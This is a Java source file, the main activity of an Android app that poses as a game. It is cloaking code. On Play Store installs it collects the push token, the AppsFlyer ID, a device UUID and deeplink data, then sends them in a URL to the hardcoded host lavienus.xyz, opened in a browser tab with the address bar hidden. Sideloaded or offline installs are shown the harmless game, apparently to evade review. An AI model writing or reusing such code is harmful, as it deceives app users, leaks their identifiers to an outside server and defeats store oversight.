package fu.nnyfro.ghunt;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Window;

import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.core.view.ViewCompat;

import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;

import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import java.util.TreeMap;
import java.util.UUID;

import fu.nnyfro.ghunt.Activities.MenuActivity;

public class MainActivity extends AppCompatActivity {
    public Boolean isFacebookDeeplinkReady = false;
    public String pushToken = "";
    public static String deeplink = "";
    public static final String DEEPLINK = "fu";
    public final String ID = "ghunt";
    public static SharedPreferences sharedPreferences;
    public static Map<String, String> deeplinkCollection;
    public static String dl = "";

    public static final String SETTINGS = "fusettings";
    public static String source="";






    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
        setContentView(R.layout.activity_main);
        setProgressBarIndeterminateVisibility(true);

        try {


            sharedPreferences = getSharedPreferences(SETTINGS, Context.MODE_PRIVATE);
            deeplinkCollection = new TreeMap<>();


            String str = "stryes";
            String str2 = "stratus";




            if (!verifyInstallerId()) {
                putIntoStorage(str2, str);

            } else if (!isNetworkAvailable()) {

                startGame();
                return;
            }



                if (sharedPreferences.getString(str2, "sayno").contains(str)) {
                    startGame();
                } else {

                    getToken();


                    getDeeplinkFromFB();
                    getDeeplinkFromPhone();




                    final Handler handler = new Handler();

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {

                            try {


                                if (!isFacebookDeeplinkReady||!ThisApplication.isInstallReferrerIsReady) {
                                    handler.postDelayed(this, 450);
                                } else {

                                    putIntoStorage(DEEPLINK, deeplink);

                                    if (checkPreferencesStorage(DEEPLINK)) {
                                        String storageDeeplink = sharedPreferences.getString(DEEPLINK, "");
                                        LnkParser parser = new LnkParser();
                                        if (storageDeeplink.contains("://")){
                                            parser.parseDeeplink1(storageDeeplink);
                                        }
                                        else{
                                            parser.parseDeeplink2(storageDeeplink);
                                        }

                                    }


                                    String lnk = createFinalString();


                                    String str;
                                    String string = sharedPreferences.getString("my_deep_link", null);
                                    int i = 1;


                                    if (!(string == null || string.isEmpty())) {

                                        lnk = String.format("%s?%s", new Object[]{lnk, MainActivity.this.decode(string)});
                                    }
                                    CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
                                    builder.enableUrlBarHiding();
                                    builder.setToolbarColor(ViewCompat.MEASURED_STATE_MASK);
                                    builder.setShowTitle(false);
                                    builder.addDefaultShareMenuItem();
                                    CustomTabsIntent build = builder.build();

                                    Iterator it = MainActivity.this.getPackageManager().getInstalledApplications(0).iterator();
                                    do {
                                        str = "com.android.chrome";
                                        if (!it.hasNext()) {
                                            i = 0;
                                            break;
                                        }
                                    } while (!((ApplicationInfo) it.next()).packageName.equals(str));
                                    if (i != 0) {
                                        build.intent.setPackage(str);
                                    }

                                    Log.i("test_", "thislnk: " + lnk);

                                    build.launchUrl(MainActivity.this, Uri.parse(lnk));

                                    finish();


                                }

                            }
                            catch (Exception ex){
                                Log.i("test_", "exception inner"+ex.getMessage());
                                startGame();
                            }

                            }

                    }, 450);


                }

        }
        catch (Exception ex){
            Log.i("test_", "exception outer "+ex.getMessage());
            startGame();
        }

    }








    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();

        if (netInfo != null && netInfo.isConnected()) {
            return true;
        } else {
            return false;
        }
    }



    public void getToken(){
        FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
            @Override
            public void onComplete(Task<InstanceIdResult> task) {
                if (task.isSuccessful()){

                    pushToken = task.getResult().getToken();

                }
            }
        });
    }


    public static void putIntoStorage(String key, String value) {
        SharedPreferences.Editor mySharedPreferencesEditor = sharedPreferences.edit();
        mySharedPreferencesEditor.putString(key, value);
        mySharedPreferencesEditor.apply();
    }


    public Boolean checkPreferencesStorage(String key){
        if (sharedPreferences.contains(key)
                && sharedPreferences.getString(key, "") != null
                && !sharedPreferences.getString(key, "").isEmpty()) {
            return true;

        } else {
            return false;
        }
    }


    public void getDeeplinkFromPhone(){
        Intent intent = getIntent();
        Uri data = intent.getData();
        if (data!=null)
        {
            deeplink = data.toString();
            Log.i("test_", "getDeeplinkFromPhone: " + deeplink);
        }


    }

    public void getDeeplinkFromFB(){
        if (FacebookSdk.isInitialized()) {


            AppLinkData.fetchDeferredAppLinkData(this, new AppLinkData.CompletionHandler() {
                @Override
                public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {

                    if (appLinkData != null) {

                        Log.i("test_", "getDeeplinkFromFB: " + deeplink);

                        deeplink = appLinkData.getTargetUri().toString();

                    }

                    isFacebookDeeplinkReady = true;


                }

            });

        }
    }


    private String decode(String str) {
        String str2;
        Exception e;
        try {
            String str3 = "";
            str2 = str;
            while (!str3.equals(str)) {
                try {
                    str2 = URLDecoder.decode(str, "UTF-8");
                    str3 = str;
                } catch (Exception e2) {
                    e = e2;
                    e.printStackTrace();
                    return str2;
                }
            }
        } catch (Exception e3) {
            str2 = str;
            e = e3;
            e.printStackTrace();
            return str2;
        }
        return str2;
    }




    public String createFinalString() {


        String dom = "lavienus.xyz";
        String appId = BuildConfig.APPLICATION_ID;
        String appsflyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        String deviceId = "";
        if (checkPreferencesStorage(ID)){
            deviceId = sharedPreferences.getString(ID, "0000000000");
        }
        else {

            deviceId = UUID.randomUUID().toString();
            putIntoStorage(ID,deviceId);
        }

        String endString = "http://"+ dom + "/" + appId;


        if (dl==null || dl.isEmpty()){
            endString+="?";
        }
        else{
            endString+="/" + dl + "?";
        }


        for (int i=0;i<=2;i++) {

            endString += generateParameteres() + "=" + generateParameteres() + "&";

        }


        endString += "device_id=" + deviceId + "&";
        endString+="internal_sub_id_2=" + appsflyerId + "&";
        endString+="source="+source + "&";
        endString+="redirect=1&push_module=1&push_token="+pushToken;


        if (!deeplinkCollection.isEmpty()) {
            endString+="&";
            for (Map.Entry<String, String> e : deeplinkCollection.entrySet()) {
                endString = endString + e.getKey() + "=" + e.getValue() + "&";
            }
            endString = endString.substring(0, endString.length() - 1);
        }


        return endString;
    }


    private String generateParameteres(){
        int wordLength = 5;
        char[] alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        String res="";
        int randIndex;
        Random random = new Random();
        for (int i = 0; i<=wordLength-1; i++) {
            randIndex = random.nextInt(alphabet.length);
            res+=alphabet[randIndex];
        }
        return res;
    }



    public void startGame() {
        Intent intent = new Intent(this, MenuActivity.class);
        startActivity(intent);
        finish();
    }




    public boolean verifyInstallerId() {
        ArrayList arrayList = new ArrayList(Arrays.asList(new String[]{"com.android.vending", "com.google.market"}));
        String installerPackageName = getPackageManager().getInstallerPackageName(getPackageName());
        return installerPackageName != null && arrayList.contains(installerPackageName);
    }
}
